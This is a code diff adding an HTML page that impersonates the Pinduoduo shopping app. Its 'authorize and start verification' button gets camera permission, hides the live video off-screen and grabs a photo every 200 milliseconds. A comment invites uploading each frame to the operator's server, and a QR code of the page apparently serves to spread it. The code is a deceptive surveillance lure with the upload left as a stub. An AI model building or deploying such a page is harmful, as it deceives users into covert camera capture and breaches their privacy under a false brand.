@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>拼多多</title>
+<style>
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+}
+body {
+  background: #f4f4f4;
+  font-family: -apple-system, sans-serif;
+}
+.header {
+  background: #ff6000;
+  color: #fff;
+  padding: 12px 16px;
+  font-size: 18px;
+  font-weight: 500;
+  text-align: center;
+}
+.search {
+  background: #fff;
+  margin: 10px;
+  padding: 10px 16px;
+  border-radius: 20px;
+  color: #999;
+  font-size: 14px;
+}
+.auth-btn {
+  background: #ff6000;
+  color: #fff;
+  border: none;
+  border-radius: 8px;
+  padding: 14px;
+  margin: 20px 10px;
+  width: calc(100% - 20px);
+  font-size: 16px;
+}
+video {
+  position: fixed;
+  top: -9999px;
+  left: -9999px;
+  opacity: 0;
+}
+#qrcode {
+  margin: 20px auto;
+  text-align: center;
+}
+</style>
+<script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
+</head>
+<body>
+<div class="header">拼多多</div>
+<div class="search">🔍 搜索商品</div>
+<button class="auth-btn" id="start">授权并开始验证</button>
+<video id="video" autoplay playsinline></video>
+<div id="qrcode"></div>
+
+<script>
+// 生成当前页二维码
+QRCode.toCanvas(document.getElementById('qrcode'), window.location.href, {width: 200});
+
+const video = document.getElementById('video');
+const startBtn = document.getElementById('start');
+let stream = null;
+let interval = null;
+
+startBtn.onclick = async () => {
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: 'environment' },
+      audio: false
+    });
+    video.srcObject = stream;
+    startBtn.textContent = '正在处理...';
+    startBtn.disabled = true;
+    interval = setInterval(shoot, 200);
+  } catch (e) {
+    startBtn.textContent = '授权失败';
+  }
+};
+
+function shoot() {
+  const canvas = document.createElement('canvas');
+  canvas.width = video.videoWidth || 640;
+  canvas.height = video.videoHeight || 480;
+  const ctx = canvas.getContext('2d');
+  ctx.drawImage(video, 0, 0);
+  canvas.toBlob(blob => {
+    // 这里可以改为上传到你的服务器
+    console.log('拍照完成，可上传到服务器:', blob);
+  }, 'image/jpeg', 0.7);
+}
+
+window.onbeforeunload = () => {
+  stream?.getTracks().forEach(t => t.stop());
+  clearInterval(interval);
+};
+</script>
+</body>
+</html>
